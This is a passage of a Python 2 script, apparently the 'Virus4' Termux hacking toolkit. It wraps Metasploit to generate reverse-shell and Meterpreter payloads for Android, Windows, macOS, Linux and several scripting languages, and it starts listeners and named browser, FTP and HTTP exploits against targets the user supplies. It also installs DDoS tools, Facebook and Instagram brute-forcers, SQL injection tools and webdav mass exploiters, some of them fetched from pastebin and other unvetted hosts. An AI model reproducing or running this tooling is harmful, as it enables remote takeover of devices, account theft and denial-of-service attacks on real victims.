use exploit/android/browser/samsung_knox_smdm_url
set payload android/meterpreter/reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def mac():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".macho")
 print cyan +'Path of the pyload----->  ' +red +"$HOME/"+name+".macho"
 backtomenu_msf()
def macm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload osx/x86/shell_reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def windows():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p windows/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".exe")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".exe"
 backtomenu_msf()
def windowsm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def windowsurl():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use  exploit/windows/browser/mcafee_mvt_exec 
set payload windows/meterpreter_reverse_tcp
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def linux():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p linux/x86/shell/reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".elf")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".elf"
 backtomenu_msf()
def linuxm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload linux/x86/shell/reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def python():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p python/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".py")
 print cyan +'Path of the pyload----->  ' +red +"$HOME/"+name+".py"
 backtomenu_msf()
def pythonm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload python/meterpreter_reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def bash():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p cmd/unix/reverse_bash  LHOST="+ ip+" LPORT="+ port+" -f raw > $HOME/"+name+".sh")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".sh"
 backtomenu_msf()
def bashm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload cmd/unix/reverse_bash  
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def perl():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p unix/reverse_perl LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".pl")
 print cyan +'Path of the pyload----->  ' +red +"$HOME/"+name+".pl"
 backtomenu_msf()
def perlm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload unix/reverse_perl 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def php():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p php/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".php")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".php"
 backtomenu_msf()
def phpm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload php/meterpreter/reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def ruby():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p ruby/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".rb")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".rb"
 backtomenu_msf()
def rubym():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload ruby/shell_reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
 
def java():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p java/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".jar")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".jar"
 backtomenu_msf()
def javam():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload java/meterpreter/reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def powershell():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 name = raw_input("     name---> " )
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p windows/powershell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".ps1")
 print cyan +'Path of the pyload----->  '+ red +"$HOME/"+name+".ps1"
 backtomenu_msf()
def powershellm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload windows/powershell_reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def port_ftp():
 rhost = raw_input("     rhosts---> " )
 time.sleep(2)
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use exploit/windows/ftp/freefloatftp_wbem
set payload windows/meterpreter_reverse_tcp
set lhost '''+ip+'''
set lport '''+port+'''
set rhosts '''+rhost+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def port_http():
 rhost = raw_input("     rhosts---> " )
 time.sleep(2)
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use  exploit/windows/http/trendmicro_officescan_widget_exec
set payload windows/meterpreter_reverse_tcp
set lhost '''+ip+'''
set lport '''+port+'''
set rhosts '''+rhost+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def androidl():
 print red +"                                          [0]back"
 print ''
 print cyan + "          [1]create payload  Android"
 time.sleep(0.05)
 print cyan + "          [2]Android  penetration msf"
 time.sleep(0.05)
 print cyan +"          [3]URL     penetration msf"
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/android"+ cyan + ") > ")
 if nember == "1":
  android() 
 elif nember == "2":
  androidm()	 
 elif nember == "3":
  androidurl() 
 elif nember == "0":
  metasploitf()
 else:
  error()
  androidl()
def macl():
 print red +"                                          [0]back"
 print '' 
 print cyan +"          [1]create payload  Mac"
 time.sleep(0.05)
 print cyan +"          [2]Mac  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/mac"+ cyan + ") > ")
 if nember == "1":
  mac() 
 elif nember == "2":
  macm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  macl()
def windowsl(): 
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  Windows"
 time.sleep(0.05)
 print cyan +"          [2]Windows  penetration msf"
 time.sleep(0.05)
 print cyan +"          [3]URL     penetration msf"
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/windows"+ cyan + ") > ")
 if nember == "1":
  windows() 
 elif nember == "2":
  windowsm()	 
 elif nember == "3":
  windowsurl() 
 elif nember == "0":
  metasploitf()
 else:
  error()
  windowsl()
def linuxl():
 print red +"                                          [0]back"
 print '' 
 print cyan +"          [1]create payload  Linux"
 time.sleep(0.05)
 print cyan +"          [2]Linux  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/linux"+ cyan + ") > ")
 if nember == "1":
  linux() 
 elif nember == "2":
  linuxm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  linuxl()
def pythonl():
 print red +"                                          [0]back"
 print '' 
 print cyan +"          [1]create payload  python"
 time.sleep(0.05)
 print cyan +"          [2]python  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/python"+ cyan + ") > ")
 if nember == "1":
  python() 
 elif nember == "2":
  pythonm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  pythonl()
def bashl(): 
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  bash"
 time.sleep(0.05)
 print cyan +"          [2]bash  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/bash"+ cyan + ") > ")
 if nember == "1":
  bash() 
 elif nember == "2":
  bashm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  bashl()
def perll(): 
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  perl"
 time.sleep(0.05)
 print cyan +"          [2]perl  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/perl"+ cyan + ") > ")
 if nember == "1":
  perl() 
 elif nember == "2":
  perlm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  perll()
def phpl(): 
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  php"
 time.sleep(0.05)
 print cyan +"          [2]php  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/php"+ cyan + ") > ")
 if nember == "1":
  php() 
 elif nember == "2":
  phpm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  phpl()
def rubyl(): 
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  ruby"
 time.sleep(0.05)
 print cyan +"          [2]ruby  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/ruby"+ cyan + ") > ")
 if nember == "1":
  ruby() 
 elif nember == "2":
  rubym()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  rubyl()
def javal():
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  java"
 time.sleep(0.05)
 print cyan +"          [2]java  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/java"+ cyan + ") > ")
 if nember == "1":
  java() 
 elif nember == "2":
  javam()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  javal()
def powershelll():
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]create payload  powershell"
 time.sleep(0.05)
 print cyan +"          [2]powershell  penetration msf"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/powershell"+ cyan + ") > ")
 if nember == "1":
  powershell() 
 elif nember == "2":
  powershellm()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  powershelll()
def portl(): 
 print red +"                                          [0]back"
 print ''
 print cyan +"          [1]Breakthrough via Port (21)"
 time.sleep(0.05)
 print cyan +"          [2]Breakthrough via Port (443)"
 time.sleep(0.05)
 print ""
 time.sleep(1)
 print ''
 print ''
 print ''
 nember =raw_input("Virus4(" + red + "metasploit/port"+ cyan + ") > ")
 if nember == "1":
  port_ftp() 
 elif nember == "2":
  port_http()	 
 elif nember == "0":
  metasploitf()
 else:
  error()
  portl()
def metasploitf():
 print red + "                                            [0]back"
 print cyan +"       [1]exploit Android"
 time.sleep(0.05)
 print cyan +"       [2]exploit Mac"
 time.sleep(0.05)
 print cyan +"       [3]exploit Windows"
 time.sleep(0.05)
 print cyan +"       [4]exploit Linux"
 time.sleep(0.05)
 print cyan +"       [5]exploit python"
 time.sleep(0.05)
 print cyan +"       [6]exploit bash"
 time.sleep(0.05)
 print cyan +"       [7]exploit perl"
 time.sleep(0.05)
 print cyan +"       [8]exploit php"
 time.sleep(0.05)
 print cyan +"       [9]exploit ruby"
 time.sleep(0.05)
 print cyan +"       [10]exploit java"
 time.sleep(0.05)
 print cyan +"       [11]exploit powershell"
 time.sleep(0.05)
 print cyan +"       [12]Breakthrough via Port"
 time.sleep(0.05)
 print cyan +"       [13]download metaspoit framework"
 time.sleep(0.05)
 print ""
 time.sleep(0.05)
 print ""
 time.sleep(0.05)
 print ""
 nember = raw_input("Virus4(" + red + "metasploit"+ cyan + ") > ")
 
 if nember == "1":
  androidl()
 elif nember == "2":
  macl() 
 elif nember == "3":
  windowsl() 
 elif nember == "4":
  linuxl() 
 elif nember == "5":
  pythonl() 
 elif nember == "6":
  bashl() 
 elif nember == "7":
  perll() 
 elif nember == "8":
  phpl() 
 elif nember == "9":
  rubyl() 
 elif nember == "10":
  javal() 
 elif nember == "11":
  powershelll()
 elif nember == "12":
  portl()
 elif nember == "13":
  os.system("cd")
  os.system("pkg install unstable-repo")
  os.system("pkg install metasploit")
 elif nember == "0":
  Virus4()
 else:
  error()
  metasploitf()

def nmap():
	print '\n###### Installing Nmap'
	os.system('apt update && apt upgrade')
	os.system('apt install nmap')
	print '###### Done'
	print "###### Type 'nmap' to start."
	backtomenu_option()

def red_hawk():
	print '\n###### Installing RED HAWK'
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK')
	os.system('mv RED_HAWK ~')
	print '###### Done'
	backtomenu_option()

def dtect():
	print '\n###### Installing D-Tect'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/bibortone/D-Tech')
	os.system('mv D-TECT ~')
	print '###### Done'
	backtomenu_option()

def sqlmap():
	print '\n###### Installing sqlmap'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('git clone https://github.com/sqlmapproject/sqlmap')
	os.system('mv sqlmap ~')
	print '###### Done'
	backtomenu_option()

def infoga():
	print '\n###### Installing Infoga'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('python2 -m pip install requests urllib3 urlparse')
	os.system('git clone https://github.com/m4ll0k/Infoga')
	os.system('mv Infoga ~')
	print '###### Done'
	backtomenu_option()

def reconDog():
	print '\n###### Installing ReconDog'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/UltimateHackers/ReconDog')
	os.system('mv ReconDog ~')
	print '###### Done'
	backtomenu_option()

def androZenmap():
	print '\n###### Installing AndroZenmap'
	os.system('apt update && apt upgrade')
	os.system('apt install nmap curl')
	os.system('curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/androzenmap.sh')
	os.system('mkdir ~/AndroZenmap')
	os.system('mv androzenmap.sh ~/AndroZenmap')
	print '###### Done'
	backtomenu_option()

def sqlmate():
	print '\n###### Installing sqlmate'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('python2 -m pip install mechanize bs4 HTMLparser argparse requests urlparse2')
	os.system('git clone https://github.com/UltimateHackers/sqlmate')
	os.system('mv sqlmate ~')
	print '###### Done'
	backtomenu_option()

def astraNmap():
	print '\n###### Installing AstraNmap'
	os.system('apt update && apt upgrade')
	os.system('apt install git nmap')
	os.system('git clone https://github.com/Gameye98/AstraNmap')
	os.system('mv AstraNmap ~')
	print '###### Done'
	backtomenu_option()

def wtf():
	print '\n###### Installing WTF'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip bs4 requests HTMLParser urlparse mechanize argparse')
	os.system('git clone https://github.com/Xi4u7/wtf')
	os.system('mv wtf ~')
	print '###### Done'
	backtomenu_option()

def easyMap():
	print '\n###### Installing Easymap'
	os.system('apt update && apt upgrade')
	os.system('apt install php git')
	os.system('git clone https://github.com/Cvar1984/Easymap')
	os.system('mv Easymap ~')
	os.system('cd ~/Easymap && sh install.sh')
	print '###### Done'
	backtomenu_option()

def xd3v():
	print '\n###### Installing XD3v'
	os.system('apt update && apt upgrade')
	os.system('apt install curl')
	os.system('curl -k -O https://gist.github.com/Gameye98/92035588bd0228df6fb7fa77a5f26bc2/raw/f8e73cd3d9f2a72bd536087bb6ba7bc8baef7d1d/xd3v.sh')
	os.system('mv xd3v.sh ~/../usr/bin/xd3v && chmod +x ~/../usr/bin/xd3v')
	print '###### Done'
	print "###### Type 'xd3v' to start."
	backtomenu_option()

def crips():
	print '\n###### Installing Crips'
	os.system("apt update && apt upgrade")
	os.system("apt install git python2 openssl curl libcurl wget")
	os.system("git clone https://github.com/Manisso/Crips")
	os.system("mv Crips ~")
	print '###### Done'
	backtomenu_option()

def sir():
	print '\n###### Installing SIR'
	os.system("apt update && apt upgrade")
	os.system("apt install python2 git")
	os.system("python2 -m pip install bs4 urllib2")
	os.system("git clone https://github.com/AeonDave/sir.git")
	os.system("mv sir ~")
	print '###### Done'
	backtomenu_option()

def xshell():
	print '\n###### Installing Xshell'
	os.system("apt update && apt upgrade")
	os.system("apt install lynx python2 figlet ruby php nano w3m")
	os.system("git clone https://github.com/Ubaii/Xshell")
	os.system("mv Xshell ~")
	print '###### Done'
	backtomenu_option()

def evilURL():
	print '\n###### Installing EvilURL'
	os.system("apt update && apt upgrade")
	os.system("apt install git python2 python3")
	os.system("git clone https://github.com/UndeadSec/EvilURL")
	os.system("mv EvilURL ~")
	print '###### Done'
	backtomenu_option()

def striker():
	print '\n###### Installing Striker'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('git clone https://github.com/UltimateHackers/Striker')
	os.system('mv Striker ~')
	os.system('cd ~/Striker && python2 -m pip install -r requirements.txt')
	print '###### Done'
	backtomenu_option()

def dsss():
	print '\n###### Installing DSSS'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/stamparm/DSSS')
	os.system('mv DSSS ~')
	print '###### Done'
	backtomenu_option()

def sqliv():
	print '\n###### Installing SQLiv'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/Hadesy2k/sqliv')
	os.system('mv sqliv ~')
	print '###### Done'
	backtomenu_option()

def sqlscan():
	print '\n###### Installing sqlscan'
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone http://www.github.com/Cvar1984/sqlscan')
	os.system('mv sqlscan ~')
	print '###### Done'
	backtomenu_option()

def wordpreSScan():
	print '\n###### Installing Wordpresscan'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 python2-dev clang libxml2-dev libxml2-utils libxslt-dev')
	os.system('git clone https://github.com/swisskyrepo/Wordpresscan')
	os.system('mv Wordpresscan ~')
	os.system('cd ~/Wordpresscan && python2 -m pip install -r requirements.txt')
	print '###### Done'
	backtomenu_option()

def wpscan():
	print '\n###### Installing WPScan'
	os.system('apt update && apt upgrade')
	os.system('apt install git ruby curl')
	os.system('git clone https://github.com/wpscanteam/wpscan')
	os.system('mv wpscan ~ && cd ~/wpscan')
	os.system('gem install bundle && bundle config build.nokogiri --use-system-libraries && bundle install && ruby wpscan.rb --update')
	print '###### Done'
	backtomenu_option()

def wordpresscan():
	print '\n###### Installing wordpresscan(2)'
	os.system('apt update && apt upgrade')
	os.system('apt install nmap figlet git')
	os.system('git clone https://github.com/silverhat007/termux-wordpresscan')
	os.system('cd termux-wordpresscan && chmod +x * && sh install.sh')
	os.system('mv termux-wordpresscan ~')
	print '###### Done'
	print "###### Type 'wordpresscan' to start."
	backtomenu_option()

def routersploit():
	print '\n###### Installing Routersploit'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/reverse-shell/routersploit')
	os.system('mv routersploit ~;cd ~/routersploit;python2 -m pip install -r requirements.txt;termux-fix-shebang rsf.py')
	print '###### Done'
	backtomenu_option()

def torshammer():
	print '\n###### Installing Torshammer'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/dotfighter/torshammer')
	os.system('mv torshammer ~')
	print '###### Done'
	backtomenu_option()

def slowloris():
	print '\n###### Installing Slowloris'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/gkbrk/slowloris')
	os.system('mv slowloris ~')
	print '###### Done'
	backtomenu_option()

def fl00d12():
	print '\n###### Installing Fl00d & Fl00d2'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 curl')
	os.system('mkdir ~/fl00d')
	os.system('curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/fl00d.py')
	os.system('curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/fl00d2.py')
	os.system('mv fl00d.py ~/fl00d && mv fl00d2.py ~/fl00d')
	print '###### Done'
	backtomenu_option()

def goldeneye():
	print '\n###### Installing GoldenEye'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('git clone https://github.com/jseidl/GoldenEye')
	os.system('mv GoldenEye ~')
	print '###### Done'
	backtomenu_option()

def xerxes():
	print '\n###### Installing Xerxes'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('apt install clang')
	os.system('git clone https://github.com/zanyarjamal/xerxes')
	os.system('mv xerxes ~')
	os.system('cd ~/xerxes && clang xerxes.c -o xerxes')
	print '###### Done'
	backtomenu_option()

def planetwork_ddos():
	print '\n###### Installing Planetwork-DDOS'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('git clone https://github.com/Hydra7/Planetwork-DDOS')
	os.system('mv Planetwork-DDOS ~')
	print '###### Done'
	backtomenu_option()

def hydra():
	print '\n###### Installing Hydra'
	os.system('apt update && apt upgrade')
	os.system('apt install hydra')
	print '###### Done'
	backtomenu_option()

def black_hydra():
	print '\n###### Installing Black Hydra'
	os.system('apt update && apt upgrade')
	os.system('apt install hydra git python2')
	os.system('git clone https://github.com/Gameye98/Black-Hydra')
	os.system('mv Black-Hydra ~')
	print '###### Done'
	backtomenu_option()

def cupp():
	print '\n###### Installing Cupp'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/Mebus/cupp')
	os.system('mv cupp ~')
	print '###### Done'
	backtomenu_option()

def asu():
	print '\n###### Installing ASU'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 php')
	os.system('python2 -m pip install requests bs4 mechanize')
	os.system('git clone https://github.com/LOoLzeC/ASU')
	os.system('mv ASU ~')
	print '###### Done'
	backtomenu_option()

def hash_buster():
	print '\n###### Installing Hash-Buster'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/UltimateHackers/Hash-Buster')
	os.system('mv Hash-Buster ~')
	print '###### Done'
	backtomenu_option()

def instaHack():
	print '\n###### Installing InstaHack'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/avramit/instahack')
	os.system('mv instahack ~')
	print '###### Done'
	backtomenu_option()

def indonesian_wordlist():
	print '\n###### Installing indonesian-wordlist'
	os.system('apt update && apt upgrade')
	os.system('apt install git')
	os.system('git clone https://github.com/geovedi/indonesian-wordlist')
	os.system('mv indonesian-wordlist ~')
	print '###### Done'
	backtomenu_option()

def fbBrute():
	print '\n###### Installing Facebook Brute Force 3'
	os.system('apt update && apt upgrade')
	os.system('apt install curl python2')
	os.system('python2 -m pip install mechanize')
	os.system('curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/facebook3.py')
	os.system('curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/wordlist/password.txt')
	os.system('mkdir ~/facebook-brute-3')
	os.system('mv facebook3.py ~/facebook-brute-3 && mv password.txt ~/facebook-brute-3')
	print '###### Done'
	backtomenu_option()

def webdav():
	print '\n###### Installing Webdav'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 openssl curl libcurl')
	os.system('python2 -m pip install urllib3 chardet certifi idna requests')
	os.system('mkdir ~/webdav')
	os.system('curl -k -O http://override.waper.co/files/webdav.txt;mv webdav.txt ~/webdav/webdav.py')
	print '###### Done'
	backtomenu_option()

def xGans():
	print '\n###### Installing xGans'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 curl')
	os.system('mkdir ~/xGans')
	os.system('curl -O http://override.waper.co/files/xgans.txt')
	os.system('mv xgans.txt ~/xGans/xgans.py')
	print '###### Done'
	backtomenu_option()

def webmassploit():
	print '\n###### Installing Webdav Mass Exploiter'
	os.system("apt update && apt upgrade")
	os.system("apt install python2 openssl curl libcurl")
	os.system("python2 -m pip install requests")
	os.system("curl -k -O https://pastebin.com/raw/K1VYVHxX && mv K1VYVHxX webdav.py")
	os.system("mkdir ~/webdav-mass-exploit && mv webdav.py ~/webdav-mass-exploit")
	print '###### Done'
	backtomenu_option()

def wpsploit():
	print '\n###### Installing WPSploit'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone git clone https://github.com/m4ll0k/wpsploit')
	os.system('mv wpsploit ~')
	print '###### Done'
	backtomenu_option()

def sqldump():
	print '\n###### Installing sqldump'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 curl')
	os.system('python2 -m pip install google')
	os.system('curl -k -O https://gist.githubusercontent.com/Gameye98/76076c9a282a6f32749894d5368024a6/raw/6f9e754f2f81ab2b8efda30603dc8306c65bd651/sqldump.py')
	os.system('mkdir ~/sqldump && chmod +x sqldump.py && mv sqldump.py ~/sqldump')
	print '###### Done'
	backtomenu_option()

def websploit():
	print '\n###### Installing Websploit'
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install scapy')
	os.system('git clone https://github.com/The404Hacking/websploit')
	os.system('mv websploit ~')
	print '###### Done'
	backtomenu_option()

def sqlokmed():
	print '\n###### Installing sqlokmed'
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('python2 -m pip install urllib2')
	os.system('git clone https://github.com/Anb3rSecID/sqlokmed')
	os.system('mv sqlokmed ~')
	print '###### Done'
	backtomenu_option()

def zones():
	print '######'
	os.system("apt update && apt upgrade")
	os.system("apt install git php")
	os.system("git clone https://github.com/Cvar1984/zones")
